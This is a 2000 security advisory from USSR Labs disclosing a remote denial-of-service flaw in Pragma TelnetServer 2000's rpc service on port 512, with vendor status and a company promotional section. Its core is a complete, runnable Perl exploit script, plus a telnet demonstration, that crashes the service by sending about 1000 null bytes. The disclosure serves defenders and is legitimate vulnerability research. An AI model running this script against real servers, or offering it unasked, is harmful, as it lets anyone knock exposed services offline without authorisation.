Hash: SHA1

Remote DoS Attack in Pragma TelnetServer 2000 (Remote Execute Daemon)
Vulnerability

USSR Advisory Code:  USSR-2000051

Release Date:
August 24, 2000

Systems Affected:
Pragma TelnetServer 2000 for Windows NT/2000


THE PROBLEM:

The Ussr Labs team has recently discovered a buffer overflow memory 
problem in the rpc module of the Pragma TelnetServer 2000

What happens is by performing an attack with a malformed request to
port 512 
it will cause the process containing the services to crash.


SPECIAL NOTE: 
That we take no responsibility for this code it is for educational
purposes only.


DEMONSTRATION:
[hellme@die-communitech.net$ telnet example.com 512
Trying example.com...
Connected to example.com.
Escape character is '^]'.
[buffer]

Where [buffer] is approx. 1000 NULL characters, and the process
containg the service crashes


EXPLOIT in Perl:
- -------------------------Start File--------------------
#!/usr/bin/perl
#########################################################
# Exploit by USSRLabs www.ussrback.com
# send 5k of null causes the server to crash.
#########################################################
#
# ./$0.pl -s <server> -p <port>
#
# Null request DoS
#
use Getopt::Std;
use Socket;

getopts('s:p', \%args);
if(!defined($args{s})){&usage;}

my($serv,$port,$URL,$buf,$in_addr,$paddr,$proto);
$serv = $args{s};		     	# remote server
$port = $args{p} || 512;	     	# remote port, default is 512
$foo = "\0";				# this is the Null
$number = "1000";			# this is the total number of Null
$data .= $foo x $number;		# result of $foo times $number
$buf = "$data"; 			# issue this response to the server

$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";

print("Data has been successfully sent to $serv\n");

sub usage {die("\n\n$0 -s <server> [ -p <port> ]\n\n");}
- -------------------------End File----------------------


Vendor Status:  
Informed!, Contacted!.

Fix: 
Fixed for Build 2 of TelnetServer 2000 released soon.

Vendor   Url: http://www.pragmasys.com
Program  Url: http://www.pragmasys.com/TelnetServer/

Related Links:

Underground Security Systems Research:
http://www.ussrback.com

CrunchSp Product:
http://www.crunchsp.com


About:

USSR is a young company based in South America devoted to 
research about computers, network security, and software
protection systems 
One of the main objectives of USSR is to develop and implement new
security and protection systems based on our knowledge and
experience.

However, we believe that the way we implement security solutions, 
can make a difference, CrunchSP is a good example.
In our day to day research we detect vulnerability issues in
different applications that we publish on our advisory board.

Most of USSR programmers and partners have more than 12 years 
of experience in different computer based applications, with 
great knowledge in high and low level programming lenguages.

For further information on USSR, feel free to contact us by email.

USSR has assembled some of the worlds greatest software developers 
and security consultants to help us provide our customers this great 
range of security services: 

* Network Penetration Testing
* Security Application development
* Application Security Testing and Certification
* Security Based on Security Tools
* Cryptography
* Emergency Response Team
* Firewalling 
* Virtual Private Networking 
* Intrusion Detection 
* Support and maintenance

Copyright (c) 1999-2000 Underground Security Systems Research.
Permission is hereby granted for the redistribution of this alert
electronically. It is not to be edited in any way without explicit
consent of Ussr. If you wish to reprint whole or any part of this
alert in any other medium excluding electronic medium, please e-mail
labs@ussrback.com for permission.

Disclaimer:
The information within this paper may change without notice. We may
not be held responsible for the use and/or potential effects of these
programs or advisories.  Use them and read them at your own risk or
not at all. You solely are responsible for this judgement. 

Feedback:
Please send suggestions, updates, and comments to:

Underground Security Systems Research
mail:labs@ussrback.com
http://www.ussrback.com

u n d e r g r o u n d  s e c u r i t y  s y s t e m s  r e s e a r c
h
http://www.ussrback.com


-----BEGIN PGP SIGNATURE-----
Version: PGPfreeware 6.5.2 for non-commercial use <http://www.pgp.com>

iQA/AwUBOaUDn63JcbWNj6DDEQIrNQCg4FV9M91dZeS9VNBWE7gKN5WV1hoAoI3/
yix9vUlqCv9n8znUY/n9cflC
=aJdL
-----END PGP SIGNATURE-----

